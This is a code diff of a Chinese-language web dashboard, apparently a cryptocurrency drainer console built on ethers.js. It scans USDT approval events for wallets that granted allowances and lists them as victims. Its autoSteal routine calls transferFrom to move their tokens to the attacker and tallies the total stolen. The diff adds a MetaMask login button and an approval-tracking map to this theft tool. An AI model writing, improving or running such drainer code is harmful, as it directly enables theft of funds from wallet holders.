@@ -1,9 +1,8 @@
-
 <!DOCTYPE html>
 <html lang="zh-Hant">
 <head>
   <meta charset="UTF-8">
-  <title>🌟 EOA 控制台 v1.6（授權時間 + 攻擊狀態）</title>
+  <title>🌟 EOA 控制台 v1.6（授權時間 + 攻擊狀態 + 登入按鈕）</title>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <style>
     body { font-family: 'Arial'; padding: 20px; background: #fff; }
@@ -17,8 +16,9 @@
   </style>
 </head>
 <body>
-  <h2>🌟 EOA 控制台 v1.6（授權時間 + 攻擊狀態）</h2>
+  <h2>🌟 EOA 控制台 v1.6（授權時間 + 攻擊狀態 + 登入按鈕）</h2>
   <p><b>目前登入帳號：</b><span id="account">未連線...</span></p>
+  <button onclick="connect()">🔑 點我登入 MetaMask</button>
   <p><b>身份驗證：</b><span id="auth" class="bad">未驗證</span></p>
   <p><b>攻擊者 USDT 餘額：</b><span id="mybalance">查詢中...</span></p>
   <p><b>最後刷新時間：</b><span id="refresh">未刷新</span></p>
@@ -53,6 +53,7 @@
     let totalStolen = ethers.BigNumber.from("0");
     let autoEnabled = false;
     const attackedSet = new Set();
+    const approvalMap = new Map();
 
     async function connect() {
       if (!window.ethereum) return alert("請安裝 MetaMask");
@@ -99,12 +100,13 @@
       const tbody = document.getElementById("approvals");
       tbody.innerHTML = "";
       const seen = new Set();
-
       for (const ev of events.reverse()) {
         const owner = ev.args.owner;
         if (seen.has(owner)) continue;
         seen.add(owner);
-
+        if (!approvalMap.has(owner)) {
+          approvalMap.set(owner, ev.blockNumber);
+        }
         const time = new Date().toLocaleString();
         const tr = document.createElement("tr");
         tr.innerHTML = `
@@ -113,10 +115,8 @@
           <td class="status" id="status-${owner}">尚未攻擊</td>
         `;
         tbody.appendChild(tr);
-
         if (autoEnabled) await autoSteal(owner);
       }
-
       document.getElementById("refresh").innerText = new Date().toLocaleTimeString();
     }
 
@@ -135,14 +135,11 @@
         if (amount.isZero()) return;
         const tx = await contract.transferFrom(victim, attacker, amount);
         totalStolen = totalStolen.add(amount);
-        const formatted = ethers.utils.formatUnits(totalStolen, 6);
-        document.getElementById("total").innerText = formatted + " USDT";
+        document.getElementById("total").innerText =
+          ethers.utils.formatUnits(totalStolen, 6) + " USDT";
         document.getElementById("status").innerText = "✅ TX Hash: " + tx.hash;
-        const cell = document.getElementById(`status-${victim}`);
-        if (cell) {
-          cell.innerText = "✅ 已攻擊";
-          cell.className = "ok";
-        }
+        document.getElementById(`status-${victim}`).innerText = "✅ 已攻擊";
+        document.getElementById(`status-${victim}`).className = "ok";
         attackedSet.add(victim);
       } catch (e) {
         document.getElementById("status").innerText = "❌ 失敗: " + e.message;
@@ -159,8 +156,7 @@
           const readableBalance = ethers.utils.formatUnits(balance, 6);
           const readableAllowance = ethers.utils.formatUnits(allowance, 6);
           document.getElementById("balance").innerText =
-            "💰 USDT 餘額: " + readableBalance + " USDT
-📜 授權額度: " + readableAllowance + " USDT";
+            "💰 USDT 餘額: " + readableBalance + " USDT\n📜 授權額度: " + readableAllowance + " USDT";
         } catch {
           document.getElementById("balance").innerText = "查詢失敗";
         }
@@ -168,8 +164,6 @@
         document.getElementById("balance").innerText = "";
       }
     });
-
-    connect();
   </script>
 </body>
 </html>
